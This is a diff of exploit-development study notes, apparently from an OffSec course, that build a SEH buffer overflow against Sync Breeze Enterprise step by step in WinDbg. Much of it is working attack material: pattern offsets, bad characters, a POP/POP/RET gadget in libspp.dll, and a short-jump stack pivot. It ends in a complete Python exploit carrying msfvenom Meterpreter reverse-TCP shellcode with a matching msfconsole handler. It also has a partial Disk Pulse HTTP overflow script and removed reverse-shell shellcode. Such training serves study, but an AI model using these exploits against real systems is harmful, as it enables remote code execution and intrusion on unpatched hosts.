@@ -1207,7 +1207,7 @@ except:
   print("Could not connect!")
 ```
 
-### VulnApp2.exe
+### VulnApp2
 
 ```python
 #!/usr/bin/python
@@ -1220,7 +1220,7 @@ try:
 
   nops = b"\x90" * 10
   # msfvenom -p windows/shell_reverse_tcp LHOST=192.168.45.156 LPORT=443 EXITFUNC=thread -f c –e x86/shikata_ga_nai -b "\x00\x3b\x45"
-  shellcode = b"\xbb\xda\xe4\xc8\x5b\xda\xdc\xd9\x74\x24\xf4\x5a\x2b\xc9\xb1\x52\x31\x5a\x12\x03\x5a\x12\x83\x18\xe0\x2a\xae\x60\x01\x28\x51\x98\xd2\x4d\xdb\x7d\xe3\x4d\xbf\xf6\x54\x7e\xcb\x5a\x59\xf5\x99\x4e\xea\x7b\x36\x61\x5b\x31\x60\x4c\x5c\x6a\x50\xcf\xde\x71\x85\x2f\xde\xb9\xd8\x2e\x27\xa7\x11\x62\xf0\xa3\x84\x92\x75\xf9\x14\x19\xc5\xef\x1c\xfe\x9e\x0e\x0c\x51\x94\x48\x8e\x50\x79\xe1\x87\x4a\x9e\xcc\x5e\xe1\x54\xba\x60\x23\xa5\x43\xce\x0a\x09\xb6\x0e\x4b\xae\x29\x65\xa5\xcc\xd4\x7e\x72\xae\x02\x0a\x60\x08\xc0\xac\x4c\xa8\x05\x2a\x07\xa6\xe2\x38\x4f\xab\xf5\xed\xe4\xd7\x7e\x10\x2a\x5e\xc4\x37\xee\x3a\x9e\x56\xb7\xe6\x71\x66\xa7\x48\x2d\xc2\xac\x65\x3a\x7f\xef\xe1\x8f\xb2\x0f\xf2\x87\xc5\x7c\xc0\x08\x7e\xea\x68\xc0\x58\xed\x8f\xfb\x1d\x61\x6e\x04\x5e\xa8\xb5\x50\x0e\xc2\x1c\xd9\xc5\x12\xa0\x0c\x49\x42\x0e\xff\x2a\x32\xee\xaf\xc2\x58\xe1\x90\xf3\x63\x2b\xb9\x9e\x9e\xbc\x06\xf6\x8d\xa0\xef\x05\xcd\xd9\x54\x80\x2b\xb3\xba\xc5\xe4\x2c\x22\x4c\x7e\xcc\xab\x5a\xfb\xce\x20\x69\xfc\x81\xc0\x04\xee\x76\x21\x53\x4c\xd0\x3e\x49\xf8\xbe\xad\x16\xf8\xc9\xcd\x80\xaf\x9e\x20\xd9\x25\x33\x1a\x73\x5b\xce\xfa\xbc\xdf\x15\x3f\x42\xde\xd8\x7b\x60\xf0\x24\x83\x2c\xa4\xf8\xd2\xfa\x12\xbf\x8c\x4c\xcc\x69\x62\x07\x98\xec\x48\x98\xde\xf0\x84\x6e\x3e\x40\x71\x37\x41\x6d\x15\xbf\x3a\x93\x85\x40\x91\x17\xa5\xa2\x33\x62\x4e\x7b\xd6\xcf\x13\x7c\x0d\x13\x2a\xff\xa7\xec\xc9\x1f\xc2\xe9\x96\xa7\x3f\x80\x87\x4d\x3f\x37\xa7\x47"
+  shellcode = b"\xbb\xda\xe4\xc8\x5b\xda\xdc\xd9\x74\x24\xf4\..."
   filler = b"A" * (2080 - len(nops) - len(shellcode))
   eip = b"\x11\x2e\x80\x14" # call ecx - 14802e11
   jumpcode = b"C" * 12
@@ -1466,7 +1466,7 @@ In most cases, an overflow tends to overwrite valid pointers and structures on t
 
 If this does not occur, an attacker can often force an exception by increasing the size of the overflow.
 
-### SEH Overflows can Bypass Stack Cookies
+**SEH Overflows can bypass Stack Cookies**
 
 Stack overflow mitigation named `GS` is enabled by default in modern versions of Visual Studio.
 
@@ -1529,13 +1529,23 @@ dt _EXCEPTION_REGISTRATION_RECORD 0x01c4ff54
 
 `_EXCEPTION_REGISTRATION_RECORD` structures are pushed on the stack from first to last.
 
-=> SEH overflows generally overwrite the last `_EXCEPTION_REGISTRATION_RECORD` structure first. Depending on the length of the overflow, it is possible to overwrite more than one `_EXCEPTION_REGISTRATION_RECORD` structure.
+=> SEH overflows generally overwrite the last `_EXCEPTION_REGISTRATION_RECORD` structure first.
 
-The exception occurs because the application is trying to read and execute from an unmapped memory page. This causes an access violation exception that needs to be handled by either the application or the OS.
+Depending on the length of the overflow, it is possible to overwrite more than one `_EXCEPTION_REGISTRATION_RECORD` structure.
+
+The exception occurs because the application is trying to read and execute from an unmapped memory page.
+
+=> An **access violation exception** that needs to be handled by either the application or the OS.
 
 List the current thread exception handler chain:
 
 `!exchain`
+
+```
+01c4fe1c: libpal!md5_starts+149fb (00b3df5b)
+01c4ff54: 41414141
+Invalid exception stack at 41414141
+```
 
 The 1st step in the SEH mechanism is to obtain the address of the first `_EXCEPTION_REGISTRATION_RECORD` structure from the TEB.
 
@@ -1582,7 +1592,7 @@ Set a breakpoint at the `ntdll!ExecuteHandler2` function to stop the execution b
 
 `bp ntdll!ExecuteHandler2`
 
-When the access violation is triggered, the 1st entry in `ExceptionList` is not overwritten by our buffer => Is still a valid `_EXCEPTION_REGISTRATION_RECORD` structure.
+When the access violation is triggered, the 1st entry in `ExceptionList` is not overwritten by our buffer.
 
 Our overflow only affects the following `_EXCEPTION_REGISTRATION_RECORD` structure in the linked list.
 
@@ -1632,7 +1642,7 @@ typedef EXCEPTION_DISPOSITION _except_handler (*PEXCEPTION_ROUTINE) (
 ); 
 ```
 
-We start by saving the EBP register on the stack and moving the stack pointer to EBP in order to easily access the arguments passed to the `ntdll!ExecuteHandler2` function (running `t` twice).
+We start by saving the EBP register on the stack and moving the stack pointer to EBP to easily access the arguments passed to the `ntdll!ExecuteHandler2` function (running `t` twice).
 
 `ff750c   push dword ptr [ebp+0Ch]  ss:0023:018ef464=018eff54`
 
@@ -1662,14 +1672,14 @@ u @edx
 
 ```
 ntdll!ExecuteHandler2+0x44:
-8b4c2404        mov     ecx,dword ptr [esp+4]
-f7410406000000  test    dword ptr [ecx+4],6
-b801000000      mov     eax,1
-7512            jne     ntdll!ExecuteHandler2+0x68 (770a3b44)
-8b4c2408        mov     ecx,dword ptr [esp+8]
-8b542410        mov     edx,dword ptr [esp+10h]
-8b4108          mov     eax,dword ptr [ecx+8]
-8902            mov     dword ptr [edx],eax
+77383b20 8b4c2404        mov     ecx,dword ptr [esp+4]
+77383b24 f7410406000000  test    dword ptr [ecx+4],6
+77383b2b b801000000      mov     eax,1
+77383b30 7512            jne     ntdll!ExecuteHandler2+0x68 (77383b44)
+77383b32 8b4c2408        mov     ecx,dword ptr [esp+8]
+77383b36 8b542410        mov     edx,dword ptr [esp+10h]
+77383b3a 8b4108          mov     eax,dword ptr [ecx+8]
+77383b3d 8902            mov     dword ptr [edx],eax
 ```
 
 `push edx` appears to place an offset into the `ntdll!ExecuteHandler2` function on the stack.
@@ -1724,22 +1734,24 @@ TEB at 003c4000
 ```
 ntdll!_EXCEPTION_REGISTRATION_RECORD
    +0x000 Next             : 0x018efe1c _EXCEPTION_REGISTRATION_RECORD
-   +0x004 Handler          : 0x770a3b20     _EXCEPTION_DISPOSITION  ntdll!ExecuteHandler2+0
+   +0x004 Handler          : 0x770a3b20   _EXCEPTION_DISPOSITION  ntdll!ExecuteHandler2+0
 ```
 
 Before pushing the parameters required for the `_except_handler` function and calling it, the OS updates `ExceptionList` with a new `_EXCEPTION_REGISTRATION_RECORD` structure.
 
 This new `_EXCEPTION_REGISTRATION_RECORD` is responsible for handling exceptions that might occur during the call to `_except_handler`.
 
-The function used to handle these exceptions is placed in EDX before the call to `ntdll!ExecuteHandler2`.
+The function used to handle these exceptions is placed in EDX  before the call to `ntdll!ExecuteHandler2`.
 
-The OS leverages various exception handlers depending on the function that is used to invoke the `_except_handler`. In our case, the handler located at `0x770a3b20` is used to deal with exceptions that might occur during the execution of `RtlpExecuteHandlerForException`.
+The OS leverages various exception handlers depending on the function that is used to invoke the `_except_handler`.
+
+In our case, the handler located at `0x770a3b20` is used to deal with exceptions that might occur during the execution of `RtlpExecuteHandlerForException`.
 
 After the execution of `_except_handler` ("call ecx"), the OS restores the original `ExceptionList` by removing the previously added `_EXCEPTION_REGISTRATION_RECORD`. This is done by executing the two instructions `mov esp,dword ptr fs:[0]` and `pop dword ptr fs:[0]`.
 
 Proceed to single-step the remaining instructions with `t` and stop at `call ecx` to inspect the address we are about to redirect the execution flow to.
 
-## Gaining Code Execution
+### Gaining Code Execution
 
 `r`
 
@@ -1796,168 +1808,654 @@ ntdll!_EXCEPTION_REGISTRATION_RECORD
 013fffc4  41414141 41414141 41414141 41414141
 ```
 
+The 2nd argument (`EstablisherFrame`) passed to the handler function points to our controlled data on the stack, i.e. the same buffer that overwrites the `_EXCEPTION_REGISTRATION_RECORD` structure.
 
+=> To redirect the execution flow to our buffer, we could overwrite the exception handler with the address of an instruction that returns into the `EstablisherFrame` address on the stack.
+
+The most common sequence of instructions used in SEH overflows is `POP R32, POP R32, RET`.
+
+In which we `POP` the **return address** and the `ExceptionRecord` argument from the stack into 2 arbitrary registers (R32) and then execute a `RET` operation to return into the `EstablisherFrame`.
+
+Before searching for a `POP, POP, RET` (P/P/R) instruction sequence,determine the exact offset required to precisely overwrite the exception handler on the stack.
+
+Generate a unique pattern with a length of 1000 bytes. This matches the input buffer size from our initial PoC that triggered the crash
+
+
+```bash
+msf-pattern_create -l 1000
 ```
 
-```
+```python
+...
+try:
+  server = sys.argv[1]
+  port = 9121
+  size = 1000
 
-
-```nasm
-
-```
-
-
-```nasm
-
-```
-
-
-```nasm
-
-```
-
-
-```nasm
-
-```
-
-
-
-```nasm
-
+  inputBuffer = b"Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8...Bg6Bg7Bg8Bg9Bh0Bh1Bh2B"
+...
 ```
 
 
-```nasm
+`!exchain`
 
+```
+0155fe1c: libpal!md5_starts+149fb (005fdf5b)
+0155ff54: 33654132
+Invalid exception stack at 65413165
 ```
 
 
-```nasm
+```bash
+msf-pattern_offset -l 1000 -q 33654132
+```
 
+```
+[*] Exact match at offset 128
 ```
 
 
-```nasm
+```python
+try:
+  server = sys.argv[1]
+  port = 9121
+  size = 1000
 
+  inputBuffer = b"\x41" * 128
+  inputBuffer+= b"\x42\x42\x42\x42"
+  inputBuffer+= b"\x43" * (size - len(inputBuffer))
 ```
 
-```nasm
+`!exchain`
 
 ```
+013afe1c: libpal!md5_starts+149fb (005fdf5b)
+013aff54: 42424242
+Invalid exception stack at 41414141
+```
 
-```nasm
+### Detecting Bad Characters
 
+```python
+try:
+  server = sys.argv[1]
+  port = 9121
+  size = 1000
+
+  badchars = (
+    b"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d"
+    b"\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a"
+    b"\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27"
+    b"\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34"
+    b"\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41"
+    b"\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e"
+    b"\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b"
+    b"\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68"
+    b"\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75"
+    b"\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82"
+    b"\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f"
+    b"\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c"
+    b"\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9"
+    b"\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6"
+    b"\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3"
+    b"\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0"
+    b"\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd"
+    b"\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea"
+    b"\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7"
+    b"\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff")
+
+  inputBuffer = b"\x41" * 128
+  inputBuffer+= b"\x42\x42\x42\x42"
+  inputBuffer+= badchars
+  inputBuffer+= b"\x43" * (size - len(inputBuffer))
+```
+
+`dds esp L5`
+
+```
+0132f338  77f16b12 ntdll!ExecuteHandler2+0x26
+0132f33c  0132f440
+0132f340  0132ff54
+0132f344  0132f45c
+0132f348  0132f3cc
+```
+
+`db 0132ff54`
+
+```
+0132ff54  41 41 41 41 42 42 42 42-01 00 00 00 ec 07 5b 00
+0132ff64  10 3e 5b 00 28 73 a0 00-72 40 5b 00 58 cf 9f 00
+```
+
+Our buffer was truncated right after the 0x01 character => `0x02` is a bad character for our exploit.
+
+After repeating this process several times we locate all the bad characters: `0x00, 0x02, 0x0A, 0x0D, 0xF8, 0xFD`
+
+### Finding a P/P/R Instruction Sequence
+
+WinDbg narly extension generates a list of all loaded modules and their respective protections. The extension is already installed on our dedicated Windows client.
+
+`.load narly`
+
+Executing `!nmod` outputs a list of all loaded modules and their memory protections
+
+`!nmod`
+
+```
+00400000 00463000 syncbrs              /SafeSEH OFF                C:\Program Files\Sync Breeze Enterprise\bin\syncbrs.exe
+10000000 10226000 libspp               /SafeSEH OFF                C:\Program Files\Sync Breeze Enterprise\bin\libspp.dll
+6cc70000 6cd09000 ODBC32               /SafeSEH ON  /GS *ASLR *DEP C:\Windows\SYSTEM32\ODBC32.dll
+...
+*DEP/*ASLR means that these modules are compatible with ASLR/DEP
+```
+
+`/SafeSEH OFF` indicates that this application and its modules are compiled without SafeSEH. Since DEP and ASLR are not displayed, they are also disabled.
+
+The most common way to bypass the SafeSEH protection is to leverage the `POP R32, POP R32, RET` instruction sequence from a module that was compiled without the `/SAFESEH` flag.
+
+To make our exploit as reliable and portable4 as possible against multiple Windows OS, try to find a `POP R32, POP R32, RET` instruction sequence located inside a module that is part of the vulnerable software.
+
+This ensures that it will be present on every installation of the software (regardless of Windows version).
+
+The `libspp.dll` application DLL is a perfect candidate. It is compiled without any protections and is loaded in a memory range which does not contain null bytes.
+
+Write a small script to search for a `P/P/R` instruction sequence.
+
+2 common approaches to writing WinDbg scripts:
+
+1. classic scripts: are normal WinDbg commands wrapped with a few control flow commands. They use pseudo-registers and don't have variables.
+
+2. `pykd`, a powerful WinDbg Python wrapper
+
+The new version of **WinDbg Preview** comes with a built-in JavaScript scripting engine (not be covered in this course).
+
+Determine the specific opcodes and the address range we'll search.
+
+We could also leverage `mona.py` for this but as of this writing, it does not work with Python 3, which is provided on the dedicated Windows client.
+
+Since we are going to search through `libspp.dll`, retrieve the start and end memory addresses with WinDbg:
+
+`lm m libspp`
+
+```
+Browse full module list
+start    end        module name
+10000000 10226000   libspp   C (export symbols)       C:\Program Files\Sync Breeze Enterprise\bin\libspp.dll
+```
+
+```bash
+msf-nasm_shell
+nasm > pop eax
+nasm > pop ebx
+nasm > pop ecx
+nasm > pop edx
+nasm > pop esi
+nasm > pop edi
+nasm > pop ebp
+nasm > ret
+```
+
+`$><C:\Users\offsec\Desktop\find_ppr.wds`
+
+```
+.block
+{
+	.for (r $t0 = 0x58; $t0 < 0x5F; r $t0 = $t0 + 0x01)
+	{
+		.for (r $t1 = 0x58; $t1 < 0x5F; r $t1 = $t1 + 0x01)
+		{
+			s-[1]b 10000000 10226000 $t0 $t1 c3
+		}
+	}
+}
 ```
 
 
-```nasm
+`u 1015a2f0 L3`
 
 ```
-
-
-```nasm
-
+libspp!pcre_exec+0x16460:
+1015a2f0 58              pop     eax
+1015a2f1 5b              pop     ebx
+1015a2f2 c3              ret
 ```
 
+```python
+try:
+  server = sys.argv[1]
+  port = 9121
+  size = 1000
 
-```nasm
-
+  inputBuffer = b"\x41" * 128
+  inputBuffer+= pack("<L", (0x1015a2f0))  # (SEH) 0x1015a2f0 - pop eax; pop ebx; ret
+  inputBuffer+= b"\x43" * (size - len(inputBuffer))
 ```
 
-
-```nasm
-
-```
-
-
-
-```nasm
+`!exchain`
 
 ```
-
-
-```nasm
-
+018ffe1c: libpal!md5_starts+149fb (0099df5b)
+018fff54: libspp!pcre_exec+16460 (1015a2f0)
+Invalid exception stack at 41414141
 ```
 
-
-```nasm
-
-```
-
-
-```nasm
+`u 1015a2f0 L3`
 
 ```
-
-
-```nasm
-
+libspp!pcre_exec+0x16460:
+1015a2f0 58              pop     eax
+1015a2f1 5b              pop     ebx
+1015a2f2 c3              ret
 ```
 
-```nasm
+`bp 0x1015a2f0`
 
 ```
-
-
-```nasm
-
+t
+t
 ```
 
-
-```nasm
-
-```
-
-
-```nasm
+`dd poi(esp) L8`
 
 ```
-
-
-```nasm
-
+018fff54  41414141 1015a2f0 43434343 43434343
+018fff64  43434343 43434343 43434343 43434343
 ```
 
+`t`
 
+After executing the `RET` instruction, we returned into the stack within our controlled buffer right before our `_except_handler` address.
 
-```nasm
+This happens because the `EstablisherFrame` points to the beginning of the `_EXCEPTION_REGISTRATION_RECORD` structure, which starts with the `Next` member followed by the `_except_handler` address.
 
-```
+### Island-Hopping in Assembly
 
-
-```nasm
-
-```
-
-
-```nasm
+`u eip L8`
 
 ```
-
-
-```nasm
-
+018fff54 41              inc     ecx
+018fff55 41              inc     ecx
+018fff56 41              inc     ecx
+018fff57 41              inc     ecx
+018fff58 f0a215104343    lock mov byte ptr ds:[43431015h],al
+018fff5e 43              inc     ebx
+018fff5f 43              inc     ebx
+018fff60 43              inc     ebx
 ```
 
+The bytes composing the P/P/R address are translated to a `lock mov byte` instruction when executed as code. This instruction uses part of our buffer as a destination address (`43431015h`) to write the content of the `AL` register.
 
-```nasm
+Because this memory address is not mapped, executing this instruction will trigger another **access violation** and break our exploit.
+
+We can overcome this by using the first 4 bytes of the `Next` structure exception handler (NSEH) to assemble an instruction that will jump over the current SEH and redirect us into our fake shellcode located after the `P/P/R` address. This is known as a "short jump" in assembly.
+
+In assembly, **short jumps** aka **short relative jumps**.
+
+These jump instructions can be relocated anywhere in memory without requiring a change of opcode.
+
+The first opcode of a short jump is always `0xEB` and the second opcode is the **relative offset**, which ranges
+- `0x00` - `0x7F` for forward short jumps,
+- `0x80` - `0xFF` for backwards short jumps.
+
+After single-stepping through the P/P/R instructions, we will use the `a` command to assemble the short jump and obtain its opcodes:
+
+`dds eip L4`
 
 ```
-
-```nasm
-
+018fff54  41414141
+018fff58  1015a2f0 libspp!pcre_exec+0x16460
+018fff5c  43434343
+018fff60  43434343
 ```
 
-
-```nasm
+`a`
 
 ```
+018fff54 jmp 0x018fff5c
+jmp 0x018fff5c
+018fff56 
+```
+
+`u eip L1`
+
+```
+018fff54 eb06            jmp     018fff5c
+```
+
+The offset for the jump is 6 bytes rather than 4 (the length of the P/P/R address). This is because the offset is calculated from the beginning of the jump instruction, which includes the `0xEB` and the offset itself.
+
+```python
+try:
+  server = sys.argv[1]
+  port = 9121
+  size = 1000
+
+  inputBuffer = b"\x41" * 124
+  inputBuffer+= pack("<L", (0x06eb9090))  # (NSEH)
+  inputBuffer+= pack("<L", (0x1015a2f0))  # (SEH) 0x1015a2f0 - pop eax; pop ebx; ret
+  inputBuffer+= b"\x43" * (size - len(inputBuffer))
+```
+
+Let the debugger continue until it hits our breakpoint `bp 0x1015a2f0`. Next, we'll single-step through the `POP, POP, RET` instructions and reach our short jump:
+
+`r`
+
+```
+0132ff54 90              nop
+```
+
+`t`
+
+```
+0132ff55 90              nop
+```
+
+`t`
+
+```
+0132ff56 eb06            jmp     0132ff5e
+```
+
+`dd eip L30`
+
+```
+0132ff56  a2f006eb 43431015 43434343 43434343
+0132ff66  43434343 43434343 43434343 43434343
+0132ff76  43434343 43434343 43434343 43434343
+0132ff86  43434343 43434343 43434343 43434343
+0132ff96  43434343 43434343 43434343 43434343
+0132ffa6  43434343 43434343 43434343 43434343
+0132ffb6  43434343 43434343 43434343 43434343
+0132ffc6  43434343 43434343 43434343 43434343
+0132ffd6  43434343 ff004343 008d0132 ffff77ed
+0132ffe6  6c77ffff 000077f1 00000000 3e100000
+0132fff6  7170005b 000000a0 ???????? ????????
+01330006  ???????? ???????? ???????? ????????
+```
+
+`!teb`
+
+```
+TEB at 7ffd8000
+    ExceptionList:        0132f34c
+    StackBase:            01330000
+    StackLimit:           0132e000
+```
+
+This amount of space may fit a small shellcode, but we would certainly prefer reverse-shell shellcode in our exploit.
+
+Our PoC sends a large amount of data (1000 bytes), so let's search the stack and see if we can find it.
+
+```python
+try:
+  server = sys.argv[1]
+  port = 9121
+  size = 1000
+
+  shellcode = b"\x43" * 400
+
+  inputBuffer = b"\x41" * 124
+  inputBuffer+= pack("<L", (0x06eb9090))  # (NSEH)
+  inputBuffer+= pack("<L", (0x1015a2f0))  # (SEH) 0x1015a2f0 - pop eax; pop ebx; ret
+  inputBuffer+= b"\x90" * (size - len(inputBuffer) - len(shellcode))
+  inputBuffer+= shellcode
+```
+
+Let the debugger continue until it hits our breakpoint `bp 0x1015a2f0`. Next, we'll single-step through the `POP, POP, RET` instructions and reach our short jump:
+
+Running our latest PoC, we can perform a search for the NOP instructions followed by the bytes contained in our shellcode variable right after taking our short jump.
+
+`t`
+
+```
+01aeff56 eb06            jmp     01aeff5e
+```
+
+`t`
+
+```
+01aeff5e 90              nop
+```
+
+`!teb`
+
+```
+TEB at 00392000
+    ExceptionList:        01aef44c
+    StackBase:            01af0000
+    StackLimit:           01aee000
+```
+
+`s -b 01aee000 01af0000 90 90 90 90 43 43 43 43 43 43 43 43`
+
+```
+01aefc70  90 90 90 90 43 43 43 43-43 43 43 43 43 43 43 43  ....CCCCCCCCCCCC
+```
+
+We found our shellcode on the stack starting from `0x01aefc74`.
+
+Confirm that our shellcode is not truncated in any way.
+
+=> Dumping the full length of the shellcode as DWORDs reveals our entire buffer:
+
+`dd 01aefc70 L65`
+
+```
+01aefc70  90909090 43434343 43434343 43434343
+01aefc80  43434343 43434343 43434343 43434343
+...
+01aefdf0  43434343 43434343 43434343 43434343
+01aefe00  43434343
+```
+
+`? 01aefe00 - 01aefc74`
+
+```
+Evaluate expression: 396 = 0000018c
+```
+
+Determine the offset from our current stack pointer to the beginning of our shellcode
+
+`? 01aefc74 - @esp`
+
+```
+Evaluate expression: 2096 = 00000830
+```
+
+To verify the consistency of the offset, we should restart the application and run our exploit multiple times. If possible, we should install the vulnerable application on different machines as well.
+
+If the offset changes slightly each time we launch our exploit, we could introduce a **bigger NOP sled**, placing our shellcode further in our buffer.
+
+Using the limited space available after our short jump, let's assemble a few instructions to increase the stack pointer by `0x830` bytes followed by a `jmp esp` to jump to our shellcode next.
+
+Cannot use an `add esp, 0x830` instruction because it generates null bytes in the opcodes due to the large value:
+
+```bash
+msf-nasm_shell 
+nasm > add esp, 0x830
+00000000  81C430080000      add esp,0x830
+```
+
+To avoid null bytes, we could use smaller jumps (of less than `0x7F`) until we reach the desired offset.
+
+Better alternatives: Instead of performing an `ADD` operation on the ESP register, we can reference the `SP` register in our assembly instruction to do arithmetic operations on the lower 16 bits.
+
+Generate the opcodes for this instruction and confirm it does not contain any bad characters.
+
+```bash
+nasm > add sp, 0x830
+00000000  6681C43008        add sp,0x830
+
+nasm > jmp esp
+00000000  FFE4              
+```
+
+```python
+try:
+  server = sys.argv[1]
+  port = 9121
+  size = 1000
+
+  shellcode = b"\x90" * 8
+  shellcode+= b"\x43" * (400 - len(shellcode))
+
+  inputBuffer = b"\x41" * 124
+  inputBuffer+= pack("<L", (0x06eb9090))  # (NSEH)
+  inputBuffer+= pack("<L", (0x1015a2f0))  # (SEH) 0x1015a2f0 - pop eax; pop ebx; ret
+  inputBuffer+= b"\x90" * 2
+  inputBuffer+= b"\x66\x81\xc4\x30\x08"   # add sp, 0x830
+  inputBuffer+= b"\xff\xe4"               # jmp esp
+  inputBuffer+= b"\x90" * (size - len(inputBuffer) - len(shellcode))
+  inputBuffer+= shellcode
+```
+
+`t`
+
+```
+01caff5e 6681c43008      add     sp,830h
+```
+
+`t`
+
+```
+01caff63 ffe4            jmp     esp {01cafc74}
+```
+
+`dd @esp L4`
+
+```
+01cafc74  90909090 90909090 43434343 43434343
+```
+
+`t`
+
+```
+01cafc74 90              nop
+```
+
+### Obtaining a Shell
+
+Generate a Meterpreter payload (~ 381 bytes)
+
+```bash
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.118.5 LPORT=443 -b "\x00\x02\x0A\x0D\xF8\xFD" -f python -v shellcode
+```
+
+Metasploit handler was able to catch our reverse meterpreter payload.
+
+```bash
+msfconsole -q -x "use exploit/multi/handler; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST 192.168.119.5; set LPORT 443; exploit"
+```
+
+```python
+#!/usr/bin/python
+import socket
+import sys
+from struct import pack
+
+try:
+  server = sys.argv[1]
+  port = 9121
+  size = 1000
+
+  # msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.118.5 LPORT=443 -b "\x00\x02\x0A\x0D\xF8\xFD" -f python -v shellcode
+  shellcode = b"\x90" * 20
+  shellcode += b""
+  shellcode += b"\xdb\xdd\xb8\xb3\xe9\xc8\x0b\xd9\x74\x24\xf4"
+  ...
+  shellcode += b"\xb3\x44\x07\x9c\x96"
+
+  inputBuffer = b"\x41" * 124
+  inputBuffer+= pack("<L", (0x06eb9090))  # (NSEH)
+  inputBuffer+= pack("<L", (0x1015a2f0))  # (SEH) 0x1015a2f0 - pop eax; pop ebx; ret
+  inputBuffer+= b"\x90" * 2
+  inputBuffer+= b"\x66\x81\xc4\x30\x08"   # add sp, 0x830
+  inputBuffer+= b"\xff\xe4"               # jmp esp
+  inputBuffer+= b"\x90" * (size - len(inputBuffer) - len(shellcode))
+  inputBuffer+= shellcode
+
+  header =  b"\x75\x19\xba\xab"
+  header += b"\x03\x00\x00\x00"
+  header += b"\x00\x40\x00\x00"
+  header += pack('<I', len(inputBuffer))
+  header += pack('<I', len(inputBuffer))
+  header += pack('<I', inputBuffer[-1])
+
+  buf = header + inputBuffer 
+
+  print("Sending evil buffer...")
+  s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+  s.connect((server, port))
+  s.send(buf)
+  s.close()
+  
+  print("Done!")
+  
+except socket.error:
+  print("Could not connect!")
+```
+
+## Extra Mile
+
+### Disk Pulse
+
+```python
+#!/usr/bin/python
+import socket, sys
+
+host = sys.argv[1]
+port = 80
+size = 6000
 
 
-```nasm
+def send_exploit_request():
 
+    # badchars = (
+    # b"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d"
+    # b"\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a"
+    # b"\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27"
+    # b"\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34"
+    # b"\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41"
+    # b"\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e"
+    # b"\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b"
+    # b"\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68"
+    # b"\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75"
+    # b"\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82"
+    # b"\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f"
+    # b"\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c"
+    # b"\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9"
+    # b"\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6"
+    # b"\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3"
+    # b"\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0"
+    # b"\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd"
+    # b"\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea"
+    # b"\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7"
+    # b"\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff")    
+
+    # found_badchars = "\x00\x09\x0a\x0d\x20"
+
+    buffer = b"\x41" * 2499
+    buffer+= b"\x42\x42\x42\x42"
+    buffer+= badchars
+    buffer+= b"\x43" * (size - len(buffer))
+
+  #HTTP Request
+    request = b"GET /" + buffer + b"HTTP/1.1" + b"\r\n"
+    request += b"Host: " + host.encode() + b"\r\n"
+    request += b"User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:31.0) Gecko/20100101 Firefox/31.0 Iceweasel/31.8.0" + b"\r\n"
+    request += b"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" + b"\r\n"
+    request += b"Accept-Language: en-US,en;q=0.5" + b"\r\n"
+    request += b"Accept-Encoding: gzip, deflate" + b"\r\n"
+    request += b"Connection: keep-alive" + b"\r\n\r\n"
+ 
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s.connect((host,port))
+    s.send(request)
+    s.close()
+
